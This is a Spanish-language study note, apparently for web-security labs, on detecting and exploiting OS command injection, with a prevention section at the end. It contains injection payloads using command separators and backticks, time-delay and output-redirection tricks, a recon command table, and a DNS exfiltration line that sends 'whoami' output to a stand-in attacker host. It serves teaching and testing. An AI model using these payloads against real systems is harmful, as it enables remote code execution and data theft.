---
aliases:
  - OS Command Injection
  - os-command-injection-entrypoint
  - command injection
  - shell injection
  - RCE por comando
tags:
  - vuln/os-command-injection
  - entrypoint
---

# OS Command Injection — Punto de entrada

> Documento **agnóstico al negocio**: *cómo **detectar y explotar** la inyección de comandos*.
> **Dónde** aplica (qué feature llama al SO) → eso vive en los `STAGE_x`.

> [!abstract] La idea en una línea
> Una feature del server **arma un comando del sistema operativo con datos que vos controlás** (un ping, un `nslookup`, un conversor de imágenes, un mail…) y lo pasa a una **shell**. Si metés un **separador de comandos**, la shell ejecuta **tu** comando pegado al de la app → **RCE** con los privilegios del proceso web.

## 🎯 Cuándo hay command injection (condiciones)

1. **Un input alimenta un comando del SO** — pistas clásicas: "check stock" con `storeID`, DNS/ping tools, feedback que manda mail (`mail -s`), thumbnails/PDF (`convert`, `wkhtmltopdf`), backups, `ping`/`nslookup`/`whois`.
2. **La app usa una shell** (`system()`, `exec()` con shell, `os.system`, backticks de Perl/PHP…) → los **metacaracteres** de la shell se interpretan.
3. **Tu dato no está saneado** (o el filtro es débil / escapea mal).

## 🧪 Cómo detectarlo

### Con output (in-band) — el fácil

Inyectás un **separador + comando** y **la salida vuelve en la respuesta**. Ej: en un `storeID=1` probás `1 & whoami &` y ves el usuario en la página. Si aparece → RCE directo.

### Blind (sin output) — la escalera

Cuando la respuesta **no** te muestra la salida, subís esta escalera **en orden** (de más simple a más furtivo):

> [!tip] Por qué el patrón `& … &`
> El `&` de adelante **cierra** el comando original; tu comando corre; el `&` de atrás lo deja "cerrado" para que **lo que la app pegue después** (comillas, más argumentos) **no rompa** tu inyección. Es el equivalente al header "colador" del smuggling: dejás todo prolijo alrededor de lo tuyo.

**1) Time delay — confirmar que ejecuta**
Si no ves nada, hacé que **tarde**. Un `ping` con N paquetes = N segundos de demora medibles:
```
& ping -c 10 127.0.0.1 &
```
Respuesta que tarda ~10s → **ejecuta** (baseline: probá sin el ping para comparar). En Windows: `ping -n 10 127.0.0.1`.

**2) Redirigir la salida a un dir web — leerla por HTTP**
Si hay una carpeta servida estáticamente y **escribible**, mandás la salida ahí y la pedís con el browser:
```
& whoami > /var/www/static/whoami.txt &
```
Después abrís `/whoami.txt` y leés el resultado. Depende de conocer/adivinar un directorio web escribible.

**3) OAST / exfil por DNS — cuando todo lo demás falla**
Sin output, sin dir escribible y con **HTTP saliente filtrado**, casi siempre **el DNS sí sale**. Usás [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator):
```
& nslookup kgji2ohoyw.web-attacker.com &          # confirma ejecución (llega el DNS)
& nslookup `whoami`.kgji2ohoyw.web-attacker.com & # EXFIL: mete la salida en el subdominio
```
En el Collaborator ves la query DNS `wwwuser.kgji2ohoyw…` → **exfiltraste `whoami`** dentro del hostname. (Truco: solo salen chars válidos de DNS; para salida con espacios/`/` usá inline + `base64`/`sed`.)

> [!note] Mismo Collaborator que en SSRF
> El OAST acá es idéntico al de [[vulnerabilities/007-ssrf/ssrf|SSRF ciego]]: no ves la respuesta, así que **hacés que el server te "llame" afuera**. DNS > HTTP porque el egress de DNS casi nunca está filtrado.

---

## 🧩 Separadores de comandos (la chuleta)

La discrepancia clave es **qué shell hay detrás**. Los primeros sirven en Windows y Unix; el resto es Unix-only.

**Linux y Windows:**
- `&` — corre lo tuyo en background y sigue
- `&&` — corre lo tuyo **si** el 1º salió OK
- `|` — pipe: la salida del 1º entra al 2º
- `||` — corre lo tuyo **si** el 1º **falló**

**Solo Linux:**
- `;` — separador de comandos secuencial
- **Newline** (`0x0a` / `\n`) — una línea nueva **es** un separador

> [!tip] Cuál probar primero
> Empezá con **`&`** (anda en las dos plataformas y no depende de que el 1º comando falle o no). Si el input va dentro de comillas o de un argumento, mirá **ejecución inline** ↓.

## 🔤 Ejecución inline (Unix) — cuando no podés separar

Si tu input cae **dentro** de un comando ya armado (p. ej. entre comillas) y los separadores no cortan, ejecutás **anidado** — corre *dentro* del comando original y su salida se sustituye ahí mismo:

```
` injected command `      ← backticks
$( injected command )     ← forma moderna, anidable
```

Ej: `filename=$(whoami).jpg` hace que el `whoami` se ejecute y su salida se use como nombre. Útil también para el **exfil por DNS** (`` `whoami` `` dentro del subdominio, como arriba).

## 🧰 Comandos básicos de recon

Lo primero que tirás al confirmar RCE, para ubicarte:

| Propósito | Linux | Windows |
| --- | --- | --- |
| Usuario actual | `whoami` | `whoami` |
| Sistema operativo | `uname -a` | `ver` |
| Configuración de red | `ifconfig` | `ipconfig /all` |
| Conexiones de red | `netstat -an` | `netstat -an` |
| Procesos corriendo | `ps -ef` | `tasklist` |

## 🛡️ Prevención (para el lado defensivo)

- **La regla de oro:** **no llamar a la shell del SO** desde código web. Usá APIs nativas del lenguaje (ej. una librería de mail en vez de invocar `mail`).
- Si es inevitable: **validación por whitelist** (valores permitidos, solo numérico, solo alfanumérico). **Nunca** intentes "escapar" los metacaracteres a mano — siempre se te escapa alguno.
- Correr el proceso con **mínimos privilegios**.

---

> [!tip] Reglas mentales
> - **Separador primero (`&`), inline (`` ` `` / `$()`) si estás encerrado en comillas.**
> - **Ciego = escalera:** `ping` (tiempo) → `> /var/www/…` (leer por HTTP) → `nslookup` (DNS/OAST + exfil).
> - **DNS sale casi siempre**, aunque HTTP esté filtrado.
> - **Recon mínimo** (`whoami`, `uname -a`) antes de escalar.

> [!note] Relación con otras vulns
> - **SSRF ciego** — mismo juego de OAST/Collaborator para confirmar sin ver la respuesta → [[vulnerabilities/007-ssrf/ssrf|SSRF]].
> - **File upload / deserialización** — otras rutas a RCE; command injection es la más directa cuando la app ya está llamando al SO.
